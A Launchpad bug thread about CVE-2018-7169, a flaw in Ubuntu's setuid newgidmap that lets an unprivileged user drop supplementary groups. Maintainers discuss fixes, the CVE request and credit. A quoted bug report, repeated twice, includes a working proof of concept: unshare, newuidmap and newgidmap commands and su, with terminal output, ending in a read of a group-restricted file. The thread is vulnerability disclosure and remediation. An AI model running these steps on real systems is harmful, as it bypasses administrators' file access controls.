| Changed in shadow (Ubuntu): | |
| **status**: | New → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Craig Furman (craigpivotal)](https://launchpad.net/~craigpivotal) wrote on 2017-11-17: |  |  | [#10](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/10) |
| --- | --- | --- | --- |

Thanks for replying Eric, but I'm having trouble reproducing what you've posted. I can't write the gid map until I've written deny to /prod/$pid/setgroups, not the other way around. There might be some nuance I've missed.

Also, newgidmap will allow a user to map their own GID to 0 in the user namespace, even when there is no entry for that user in /etc/subgid.

What if newgidmap wrote "deny" to /proc/$pid/setgroups unless the user is whitelisted in some config file, probably separate from /etc/subgid, as Stéphane suggested?

Thanks for replying Eric, but I'm having trouble reproducing what you've posted. I can't write the gid map until I've written deny to /prod/$pid/setgroups, not the other way around. There might be some nuance I've missed.
Also, newgidmap will allow a user to map their own GID to 0 in the user namespace, even when there is no entry for that user in /etc/subgid.
What if newgidmap wrote "deny" to /proc/$pid/setgroups unless the user is whitelisted in some config file, probably separate from /etc/subgid, as Stéphane suggested?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-01-15: |  |  | [#11](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/11) |
| --- | --- | --- | --- |

> Thanks for replying Eric, but I'm having trouble reproducing what you've

> posted. I can't write the gid map until I've written deny to

> /prod/$pid/setgroups, not the other way around. There might be some nuance

> I've missed.

Yes, this is a security feature. setgroups must be written to \*before\* gid\_map

(the reason for this is explained further in user\_namespaces(7)). And only

privileged users are allowed to write to gid\_map if setgroups is set to allow.

> Also, newgidmap will allow a user to map their own GID to 0 in the user

> namespace, even when there is no entry for that user in /etc/subgid.

This is something that is generally required for a container to function, and

isn't fundamentally a security issue because users are already allowed to do

that without privileges (this is how rootless containers and LXC unprivileged

containers work) -- \*unless\* in this mode newgidmap is setting setgroups=allow

(in which case this is a major security problem).

> What if newgidmap wrote "deny" to /proc/$pid/setgroups unless the user is

> whitelisted in some config file, probably separate from /etc/subgid, as

> Stéphane suggested?

:+1: I'd prefer if we implemented this by changing the /etc/subgid schema so

that rather than having the format

user:id:id\_cnt

It has the format

user:id:id\_cnt[:flagA,flagB,...]

And we define flags "allow\_setgroups" and "deny\_setgrouops" (with

"deny\_setgroups" being the default). This way, administrators can be \*explicit\*

about the denial, we don't add any new configuration files, and it's backwards

compatible (with security being opt-out).

I imagine making deny\_setgroups might be a \*bit\* contentious, but in the worst

case we could have a migration script that asks users (or just add a document

about it to the logfile for the upgrade).

> Thanks for replying Eric, but I'm having trouble reproducing what you've
> posted. I can't write the gid map until I've written deny to
> /prod/$pid/setgroups, not the other way around. There might be some nuance
> I've missed.
Yes, this is a security feature. setgroups must be written to \*before\* gid\_map
(the reason for this is explained further in user\_namespaces(7)). And only
privileged users are allowed to write to gid\_map if setgroups is set to allow.
> Also, newgidmap will allow a user to map their own GID to 0 in the user
> namespace, even when there is no entry for that user in /etc/subgid.
This is something that is generally required for a container to function, and
isn't fundamentally a security issue because users are already allowed to do
that without privileges (this is how rootless containers and LXC unprivileged
containers work) -- \*unless\* in this mode newgidmap is setting setgroups=allow
(in which case this is a major security problem).
> What if newgidmap wrote "deny" to /proc/$pid/setgroups unless the user is
> whitelisted in some config file, probably separate from /etc/subgid, as
> Stéphane suggested?
:+1: I'd prefer if we implemented this by changing the /etc/subgid schema so
that rather than having the format
user:id:id\_cnt
It has the format
user:id:id\_cnt[:flagA,flagB,...]
And we define flags "allow\_setgroups" and "deny\_setgrouops" (with
"deny\_setgroups" being the default). This way, administrators can be \*explicit\*
about the denial, we don't add any new configuration files, and it's backwards
compatible (with security being opt-out).
I imagine making deny\_setgroups might be a \*bit\* contentious, but in the worst
case we could have a migration script that asks users (or just add a document
about it to the logfile for the upgrade).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Akihiro Suda (suda-kyoto)](https://launchpad.net/~suda-kyoto) wrote on 2018-01-15: |  |  | [#12](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/12) |
| --- | --- | --- | --- |

> And we define flags "allow\_setgroups" and "deny\_setgrouops" (with

"deny\_setgroups" being the default).

I think allow\_setgropus should be the default for keeping compatibility.

However, useradd(8) may print warning for the default configuration.

> And we define flags "allow\_setgroups" and "deny\_setgrouops" (with
"deny\_setgroups" being the default).
I think allow\_setgropus should be the default for keeping compatibility.
However, useradd(8) may print warning for the default configuration.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2018-01-15: |  |  | [#13](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/13) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/13/%2Bdownload) (5.0 KiB)

This sounds acceptable to me. Issues or (even better) PRs against

github.com/shadow-maint/shadow would be great :)

Indeed the default should be the more permissible. (I won't accept

patches which require changes to the container runtime.)

On Mon, Jan 15, 2018 at 9:13 AM, Akihiro Suda <email address hidden> wrote:

>> And we define flags "allow\_setgroups" and "deny\_setgrouops" (with

> "deny\_setgroups" being the default).

>

>

> I think allow\_setgropus should be the default for keeping compatibility.

>

> However, useradd(8) may print warning for the default configuration.

>

> --

> You received this bug notification because you are subscribed to the bug

> report.

> <https://bugs.launchpad.net/bugs/1729357>

>

> Title:

> unprivileged user can drop supplementary groups

>

> Status in shadow package in Ubuntu:

> Confirmed

>

> Bug description:

> Distribution: Ubuntu 16.04.3 LTS

> Kernel: 4.4.0-97-generic

> uidmap package version: 1:4.2-3.1ubuntu5.3

>

> The newgidmap setuid executable allows any user to write a single

> mapping line to the gid\_map of a process whose identity is the same as

> the calling process, as long as that mapping line maps the process's

> own GID outside of the user namespace to GID 0 inside the user

> namespace.

>

> Newgidmap will write the mapping regardless of the content of

> /proc/$process\_being\_mapped/setgroups, which will initially contain

> the string "allow". After this mapping is performed, and also after

> the process' uid\_map is written with newuidmap, the process in the

> user namespace will be able to use the setgroups system call to drop

> supplementary groups.

>

> This is possible even if there is no entry for the user in

> /etc/subgid, because no subordinate GIDs are actually being used.

>

> This allows any user to circumvent the use of supplementary groups as

> blacklists, e.g. for some file owned by root:blacklist with permission

> bits 0604 (octal). Normally any process whose identity included the

> group "blacklist" in its supplementary groups would not be able to

> read that file. By performing this exploit using newgidmap, they can

> drop all supplementary groups and read that file.

>

> If newgidmap was not available, unprivileged users would not be able

> to write a process's gid\_map until writing "deny" to

> /proc/$pid/setgroups. A fix for this might be for newgidmap to check

> the content of /proc/$process\_being\_mapped/setgroups is "deny", but we

> have not tried to patch this ourselves.

>

> An example using 2 login shells for a user named "someone" on Ubuntu

> Xenial, with the uidmap package installed:

>

> Shell 1

>

> someone@ubuntu-xenial:~$ id

> uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)

>

> someone@ubuntu-xenial:~$ ls -al /tmp/should\_restrict

> -rw----r-- 1 root restricted 8 Nov 1 12:23 /tmp/should\_restrict

>

> someone@ubuntu-xenial:~$ cat /tmp/should\_restrict

> cat: /tmp/should\_restrict: Permission denied

>

> someone@ubuntu-xenial:~$ unshare -U --setgroups allow #

> /proc/self/setgroups already contains 'allow', but let's be explicit

>

> nobody@ubuntu-xenial:~$ echo $$

> 1878

>

> Sh...

[Read more...](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/13)

This sounds acceptable to me. Issues or (even better) PRs against
github.com/shadow-maint/shadow would be great :)
Indeed the default should be the more permissible. (I won't accept
patches which require changes to the container runtime.)
On Mon, Jan 15, 2018 at 9:13 AM, Akihiro Suda <suda.kyoto@gmail.com> wrote:
>> And we define flags "allow\_setgroups" and "deny\_setgrouops" (with
> "deny\_setgroups" being the default).
>
>
> I think allow\_setgropus should be the default for keeping compatibility.
>
> However, useradd(8) may print warning for the default configuration.
>
> --
> You received this bug notification because you are subscribed to the bug
> report.
> https://bugs.launchpad.net/bugs/1729357
>
> Title:
> unprivileged user can drop supplementary groups
>
> Status in shadow package in Ubuntu:
> Confirmed
>
> Bug description:
> Distribution: Ubuntu 16.04.3 LTS
> Kernel: 4.4.0-97-generic
> uidmap package version: 1:4.2-3.1ubuntu5.3
>
> The newgidmap setuid executable allows any user to write a single
> mapping line to the gid\_map of a process whose identity is the same as
> the calling process, as long as that mapping line maps the process's
> own GID outside of the user namespace to GID 0 inside the user
> namespace.
>
> Newgidmap will write the mapping regardless of the content of
> /proc/$process\_being\_mapped/setgroups, which will initially contain
> the string "allow". After this mapping is performed, and also after
> the process' uid\_map is written with newuidmap, the process in the
> user namespace will be able to use the setgroups system call to drop
> supplementary groups.
>
> This is possible even if there is no entry for the user in
> /etc/subgid, because no subordinate GIDs are actually being used.
>
> This allows any user to circumvent the use of supplementary groups as
> blacklists, e.g. for some file owned by root:blacklist with permission
> bits 0604 (octal). Normally any process whose identity included the
> group "blacklist" in its supplementary groups would not be able to
> read that file. By performing this exploit using newgidmap, they can
> drop all supplementary groups and read that file.
>
> If newgidmap was not available, unprivileged users would not be able
> to write a process's gid\_map until writing "deny" to
> /proc/$pid/setgroups. A fix for this might be for newgidmap to check
> the content of /proc/$process\_being\_mapped/setgroups is "deny", but we
> have not tried to patch this ourselves.
>
> An example using 2 login shells for a user named "someone" on Ubuntu
> Xenial, with the uidmap package installed:
>
> Shell 1
>
> someone@ubuntu-xenial:~$ id
> uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)
>
> someone@ubuntu-xenial:~$ ls -al /tmp/should\_restrict
> -rw----r-- 1 root restricted 8 Nov 1 12:23 /tmp/should\_restrict
>
> someone@ubuntu-xenial:~$ cat /tmp/should\_restrict
> cat: /tmp/should\_restrict: Permission denied
>
> someone@ubuntu-xenial:~$ unshare -U --setgroups allow #
> /proc/self/setgroups already contains 'allow', but let's be explicit
>
> nobody@ubuntu-xenial:~$ echo $$
> 1878
>
> Shell 2
>
> someone@ubuntu-xenial:~$ cat /etc/subuid
> lxd:100000:65536
> root:100000:65536
> ubuntu:165536:65536
>
> someone@ubuntu-xenial:~$ cat /etc/subgid
> lxd:100000:65536
> root:100000:65536
> ubuntu:165536:65536
>
> # There are no entries in /etc/sub{u,g}id for someone, but this
> doesn't matter that much as subordinate IDs are not being requested.
>
> someone@ubuntu-xenial:~$ newuidmap 1878 0 1001 1
>
> someone@ubuntu-xenial:~$ newgidmap 1878 0 1001 1
>
> Back to shell 1
>
> nobody@ubuntu-xenial:~$ id
> uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
>
> # The presence of the "nogroup" supplementary group indicates that
> some unmapped GIDs are present as supplementary GIDs. The kernel knows
> that this process still has "restricted" in its supplementary groups,
> so it can't read the restricted file yet.
>
> nobody@ubuntu-xenial:~$ cat /tmp/should\_restrict
> cat: /tmp/should\_restrict: Permission denied
>
> # The process has gained CAP\_SETGID in its user namespace by becoming
> UID 0. /proc/$pid/setgroups contains "allow", so it can call
> setgroups(2). By su-ing to root (itself, in the user namespace), it
> can drop the supplementary groups. It can't read /root/.bashrc as that
> file is owned by UID 0 in the initial user namespace, which creates
> some distracting error output but doesn't matter in this case.
>
> nobody@ubuntu-xenial:~$ su root
> su: Authentication failure
> (Ignored)
> bash: /root/.bashrc: Permission denied
>
> # Supplementary groups have been dropped
>
> root@ubuntu-xenial:~# id
> uid=0(root) gid=0(root) groups=0(root)
>
> # It can read the restricted file
>
> root@ubuntu-xenial:~# cat /tmp/should\_restrict
> content
>
> To manage notifications about this bug go to:
> https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+subscriptions

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-01-15: |  |  | [#14](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/14) |
| --- | --- | --- | --- |

Serge: I will submit a patch later today. However, I just thought that it's probably better that "allow\_setgroups" should be "ignore\_setgroups" and we retain the current behaviour (we don't write anything to /proc/$pid/setgroups) -- which allows a user (or runtime) to explicitly disable setgroups even if they would normally have the right to use setgroups.

Does that sound okay to you? I will make the default ignore\_setgroups, but IMO we should change the default for `useradd` to (by default) set deny\_setgroups.

Serge: I will submit a patch later today. However, I just thought that it's probably better that "allow\_setgroups" should be "ignore\_setgroups" and we retain the current behaviour (we don't write anything to /proc/$pid/setgroups) -- which allows a user (or runtime) to explicitly disable setgroups even if they would normally have the right to use setgroups.
Does that sound okay to you? I will make the default ignore\_setgroups, but IMO we should change the default for `useradd` to (by default) set deny\_setgroups.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-01-15: |  |  | [#15](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/15) |
| --- | --- | --- | --- |

Oh, and we should definitely get a CVE assigned IMO.

Oh, and we should definitely get a CVE assigned IMO.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Akihiro Suda (suda-kyoto)](https://launchpad.net/~suda-kyoto) wrote on 2018-02-15: |  |  | [#16](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/16) |
| --- | --- | --- | --- |

@cyphar

Did you submit patch/CVE?

@cyphar
Did you submit patch/CVE?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-15: |  |  | [#17](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/17) |
| --- | --- | --- | --- |

I had a preliminary patch written, but it was getting quite complicated (shadow's codebase is much more complicated than I expected -- and the /etc/subgid parsing code is intertwined with the parsing code for all of the other /etc/... files). I am working on it though.

I've also email the SUSE Security team about getting a CVE assigned, though I'm not sure if it's better that we get it assigned or that the Ubuntu folks get it assigned.

I had a preliminary patch written, but it was getting quite complicated (shadow's codebase is much more complicated than I expected -- and the /etc/subgid parsing code is intertwined with the parsing code for all of the other /etc/... files). I am working on it though.
I've also email the SUSE Security team about getting a CVE assigned, though I'm not sure if it's better that we get it assigned or that the Ubuntu folks get it assigned.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-15: |  |  | [#18](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/18) |
| --- | --- | --- | --- |

I've just sent a request for a CVE. I'm working on the patch now. My current plan is that allow\_setgroups will be the default for all mappings that are present in /etc/subgid -- but any "implicit" mappings (like mapping your own group) will be deny\_setgroups by default (because that's the biggest security issue coming out of this bug -- that \*any\* user can drop groups, not just the ones with subgids set up).

I've just sent a request for a CVE. I'm working on the patch now. My current plan is that allow\_setgroups will be the default for all mappings that are present in /etc/subgid -- but any "implicit" mappings (like mapping your own group) will be deny\_setgroups by default (because that's the biggest security issue coming out of this bug -- that \*any\* user can drop groups, not just the ones with subgids set up).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2018-02-15: |  |  | [#19](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/19) |
| --- | --- | --- | --- |

On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:

> I've just sent a request for a CVE. I'm working on the patch now. My

I assume the CVE will at least be correctly attributed to Craig.

Christian

On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:
> I've just sent a request for a CVE. I'm working on the patch now. My
I assume the CVE will at least be correctly attributed to Craig.
Christian

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-15: |  |  | [#20](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/20) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/20/%2Bdownload) (5.0 KiB)

Yes, of course. "Craig Furman (Pivotal)" is in the credits. I also

added Akihiro Suda (for suggesting him that it was a newgidmap bug)

and myself (for working on a fix for it), but if Craig prefers I can

just make him the only credit.

On Thu, Feb 15, 2018 at 11:00 PM, Christian Brauner

<email address hidden> wrote:

> On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:

>> I've just sent a request for a CVE. I'm working on the patch now. My

>

> I assume the CVE will at least be correctly attributed to Craig.

>

> Christian

>

> --

> You received this bug notification because you are subscribed to the bug

> report.

> <https://bugs.launchpad.net/bugs/1729357>

>

> Title:

> unprivileged user can drop supplementary groups

>

> Status in shadow package in Ubuntu:

> Confirmed

>

> Bug description:

> Distribution: Ubuntu 16.04.3 LTS

> Kernel: 4.4.0-97-generic

> uidmap package version: 1:4.2-3.1ubuntu5.3

>

> The newgidmap setuid executable allows any user to write a single

> mapping line to the gid\_map of a process whose identity is the same as

> the calling process, as long as that mapping line maps the process's

> own GID outside of the user namespace to GID 0 inside the user

> namespace.

>

> Newgidmap will write the mapping regardless of the content of

> /proc/$process\_being\_mapped/setgroups, which will initially contain

> the string "allow". After this mapping is performed, and also after

> the process' uid\_map is written with newuidmap, the process in the

> user namespace will be able to use the setgroups system call to drop

> supplementary groups.

>

> This is possible even if there is no entry for the user in

> /etc/subgid, because no subordinate GIDs are actually being used.

>

> This allows any user to circumvent the use of supplementary groups as

> blacklists, e.g. for some file owned by root:blacklist with permission

> bits 0604 (octal). Normally any process whose identity included the

> group "blacklist" in its supplementary groups would not be able to

> read that file. By performing this exploit using newgidmap, they can

> drop all supplementary groups and read that file.

>

> If newgidmap was not available, unprivileged users would not be able

> to write a process's gid\_map until writing "deny" to

> /proc/$pid/setgroups. A fix for this might be for newgidmap to check

> the content of /proc/$process\_being\_mapped/setgroups is "deny", but we

> have not tried to patch this ourselves.

>

> An example using 2 login shells for a user named "someone" on Ubuntu

> Xenial, with the uidmap package installed:

>

> Shell 1

>

> someone@ubuntu-xenial:~$ id

> uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)

>

> someone@ubuntu-xenial:~$ ls -al /tmp/should\_restrict

> -rw----r-- 1 root restricted 8 Nov 1 12:23 /tmp/should\_restrict

>

> someone@ubuntu-xenial:~$ cat /tmp/should\_restrict

> cat: /tmp/should\_restrict: Permission denied

>

> someone@ubuntu-xenial:~$ unshare -U --setgroups allow #

> /proc/self/setgroups already contains 'allow', but let's be explicit

>

> nobody@ubuntu-xenial:~$ echo $$

> 1878

>

> Shell 2

>

> someone@ubuntu-xenia...

[Read more...](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/20)

Yes, of course. "Craig Furman (Pivotal)" is in the credits. I also
added Akihiro Suda (for suggesting him that it was a newgidmap bug)
and myself (for working on a fix for it), but if Craig prefers I can
just make him the only credit.
On Thu, Feb 15, 2018 at 11:00 PM, Christian Brauner
<christian.brauner@canonical.com> wrote:
> On Thu, Feb 15, 2018 at 11:29:03AM -0000, Aleksa Sarai wrote:
>> I've just sent a request for a CVE. I'm working on the patch now. My
>
> I assume the CVE will at least be correctly attributed to Craig.
>
> Christian
>
> --
> You received this bug notification because you are subscribed to the bug
> report.
> https://bugs.launchpad.net/bugs/1729357
>
> Title:
> unprivileged user can drop supplementary groups
>
> Status in shadow package in Ubuntu:
> Confirmed
>
> Bug description:
> Distribution: Ubuntu 16.04.3 LTS
> Kernel: 4.4.0-97-generic
> uidmap package version: 1:4.2-3.1ubuntu5.3
>
> The newgidmap setuid executable allows any user to write a single
> mapping line to the gid\_map of a process whose identity is the same as
> the calling process, as long as that mapping line maps the process's
> own GID outside of the user namespace to GID 0 inside the user
> namespace.
>
> Newgidmap will write the mapping regardless of the content of
> /proc/$process\_being\_mapped/setgroups, which will initially contain
> the string "allow". After this mapping is performed, and also after
> the process' uid\_map is written with newuidmap, the process in the
> user namespace will be able to use the setgroups system call to drop
> supplementary groups.
>
> This is possible even if there is no entry for the user in
> /etc/subgid, because no subordinate GIDs are actually being used.
>
> This allows any user to circumvent the use of supplementary groups as
> blacklists, e.g. for some file owned by root:blacklist with permission
> bits 0604 (octal). Normally any process whose identity included the
> group "blacklist" in its supplementary groups would not be able to
> read that file. By performing this exploit using newgidmap, they can
> drop all supplementary groups and read that file.
>
> If newgidmap was not available, unprivileged users would not be able
> to write a process's gid\_map until writing "deny" to
> /proc/$pid/setgroups. A fix for this might be for newgidmap to check
> the content of /proc/$process\_being\_mapped/setgroups is "deny", but we
> have not tried to patch this ourselves.
>
> An example using 2 login shells for a user named "someone" on Ubuntu
> Xenial, with the uidmap package installed:
>
> Shell 1
>
> someone@ubuntu-xenial:~$ id
> uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)
>
> someone@ubuntu-xenial:~$ ls -al /tmp/should\_restrict
> -rw----r-- 1 root restricted 8 Nov 1 12:23 /tmp/should\_restrict
>
> someone@ubuntu-xenial:~$ cat /tmp/should\_restrict
> cat: /tmp/should\_restrict: Permission denied
>
> someone@ubuntu-xenial:~$ unshare -U --setgroups allow #
> /proc/self/setgroups already contains 'allow', but let's be explicit
>
> nobody@ubuntu-xenial:~$ echo $$
> 1878
>
> Shell 2
>
> someone@ubuntu-xenial:~$ cat /etc/subuid
> lxd:100000:65536
> root:100000:65536
> ubuntu:165536:65536
>
> someone@ubuntu-xenial:~$ cat /etc/subgid
> lxd:100000:65536
> root:100000:65536
> ubuntu:165536:65536
>
> # There are no entries in /etc/sub{u,g}id for someone, but this
> doesn't matter that much as subordinate IDs are not being requested.
>
> someone@ubuntu-xenial:~$ newuidmap 1878 0 1001 1
>
> someone@ubuntu-xenial:~$ newgidmap 1878 0 1001 1
>
> Back to shell 1
>
> nobody@ubuntu-xenial:~$ id
> uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
>
> # The presence of the "nogroup" supplementary group indicates that
> some unmapped GIDs are present as supplementary GIDs. The kernel knows
> that this process still has "restricted" in its supplementary groups,
> so it can't read the restricted file yet.
>
> nobody@ubuntu-xenial:~$ cat /tmp/should\_restrict
> cat: /tmp/should\_restrict: Permission denied
>
> # The process has gained CAP\_SETGID in its user namespace by becoming
> UID 0. /proc/$pid/setgroups contains "allow", so it can call
> setgroups(2). By su-ing to root (itself, in the user namespace), it
> can drop the supplementary groups. It can't read /root/.bashrc as that
> file is owned by UID 0 in the initial user namespace, which creates
> some distracting error output but doesn't matter in this case.
>
> nobody@ubuntu-xenial:~$ su root
> su: Authentication failure
> (Ignored)
> bash: /root/.bashrc: Permission denied
>
> # Supplementary groups have been dropped
>
> root@ubuntu-xenial:~# id
> uid=0(root) gid=0(root) groups=0(root)
>
> # It can read the restricted file
>
> root@ubuntu-xenial:~# cat /tmp/should\_restrict
> content
>
> To manage notifications about this bug go to:
> https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+subscriptions
--
Aleksa Sarai (cyphar)
www.cyphar.com

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Craig Furman (craigpivotal)](https://launchpad.net/~craigpivotal) wrote on 2018-02-15: |  |  | [#21](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/21) |
| --- | --- | --- | --- |

Thanks for the credit! I did highlight that the bug was in newgidmap in my initial report, by the way.

Aleksa, thanks for asking for a CVE? How did you go about this? This is new territory to me.

Thanks for the credit! I did highlight that the bug was in newgidmap in my initial report, by the way.
Aleksa, thanks for asking for a CVE? How did you go about this? This is new territory to me.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-15: |  |  | [#22](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/22) |
| --- | --- | --- | --- |

On Thu, Feb 15, 2018 at 11:30 PM, Craig Furman

<email address hidden> wrote:

> Thanks for the credit! I did highlight that the bug was in newgidmap in

> my initial report, by the way.

No problem -- you found the issue after all. Sorry for getting the timeline

wrong, did you want me to change the credits at all? It's your call.

> Aleksa, thanks for asking for a CVE? How did you go about this? This is

> new territory to me.

You just submit the online form at <https://cveform.mitre.org/>. You can also go

through the project if the project is registered with MITRE. (Canonical is

registered for example, but since this bug affects all distributions and not

just Ubuntu I felt it made more sense to just submit directly.)

There didn't appear to be any way for me to add you to Cc in the form (I could

only provide a single contact address), but I can forward the mails to you.

--

Aleksa Sarai (cyphar)

www.cyphar.com

On Thu, Feb 15, 2018 at 11:30 PM, Craig Furman
<1729357@bugs.launchpad.net> wrote:
> Thanks for the credit! I did highlight that the bug was in newgidmap in
> my initial report, by the way.
No problem -- you found the issue after all. Sorry for getting the timeline
wrong, did you want me to change the credits at all? It's your call.
> Aleksa, thanks for asking for a CVE? How did you go about this? This is
> new territory to me.
You just submit the online form at https://cveform.mitre.org/. You can also go
through the project if the project is registered with MITRE. (Canonical is
registered for example, but since this bug affects all distributions and not
just Ubuntu I felt it made more sense to just submit directly.)
There didn't appear to be any way for me to add you to Cc in the form (I could
only provide a single contact address), but I can forward the mails to you.
--
Aleksa Sarai (cyphar)
www.cyphar.com

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Craig Furman (craigpivotal)](https://launchpad.net/~craigpivotal) wrote on 2018-02-15: |  |  | [#23](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/23) |
| --- | --- | --- | --- |

It's really not a problem, I'm happy to leave it as it is.

It's really not a problem, I'm happy to leave it as it is.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-15: |  |  | [#24](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/24) |
| --- | --- | --- | --- |

<https://github.com/shadow-maint/shadow/pull/97> is my proposed patch. It currently only deals with the immediate security issue of allowing users that don't have

% echo "$(whoami):$(id -g):1" >> /etc/setgid

... set up. I've tested this with a couple of different setups and it appears to preserve behaviour when you're mapping subgid'd groups, but it restricts setgroups if the mapping is a fallback one. I was working on a patch for the flags code, but there's a lot of magic in the parsing code for that -- so I will work on that separately.

https://github.com/shadow-maint/shadow/pull/97 is my proposed patch. It currently only deals with the immediate security issue of allowing users that don't have
% echo "$(whoami):$(id -g):1" >> /etc/setgid
... set up. I've tested this with a couple of different setups and it appears to preserve behaviour when you're mapping subgid'd groups, but it restricts setgroups if the mapping is a fallback one. I was working on a patch for the flags code, but there's a lot of magic in the parsing code for that -- so I will work on that separately.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-16: |  |  | [#25](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/25) |
| --- | --- | --- | --- |

CVE-2018-7169 is assigned for this issue.

CVE-2018-7169 is assigned for this issue.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Kbabioch-b (kbabioch-b)](https://launchpad.net/~kbabioch-b) wrote on 2018-02-16: |  |  | [#26](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/26) |
| --- | --- | --- | --- |

CVE-2018-7169

An issue was discovered in shadow 4.5. newgidmap (in shadow-utils) is setuid and

allows an unprivileged user to be placed in a user namespace where setgroups(2)

is permitted. This allows an attacker to remove themselves from a supplementary

group, which may allow access to certain filesystem paths if the administrator

has used "group blacklisting" (e.g., chmod g-rwx) to restrict access to paths.

This flaw effectively reverts a security feature in the kernel (in particular,

the /proc/self/setgroups knob) to prevent this sort of privilege escalation.

References:

<http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-7169>

<http://www.cvedetails.com/cve/CVE-2018-7169/>

[https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357)

CVE-2018-7169
An issue was discovered in shadow 4.5. newgidmap (in shadow-utils) is setuid and
allows an unprivileged user to be placed in a user namespace where setgroups(2)
is permitted. This allows an attacker to remove themselves from a supplementary
group, which may allow access to certain filesystem paths if the administrator
has used "group blacklisting" (e.g., chmod g-rwx) to restrict access to paths.
This flaw effectively reverts a security feature in the kernel (in particular,
the /proc/self/setgroups knob) to prevent this sort of privilege escalation.
References:
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-7169
http://www.cvedetails.com/cve/CVE-2018-7169/
https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Kbabioch-b (kbabioch-b)](https://launchpad.net/~kbabioch-b) wrote on 2018-02-16: |  |  | [#27](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/27) |
| --- | --- | --- | --- |

SUSE:SLE-12:Update is not affected, since newgidmap was only introduced with 4.2.1. We still ship 4.1.5.1.

SUSE:SLE-12:Update is not affected, since newgidmap was only introduced with 4.2.1. We still ship 4.1.5.1.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

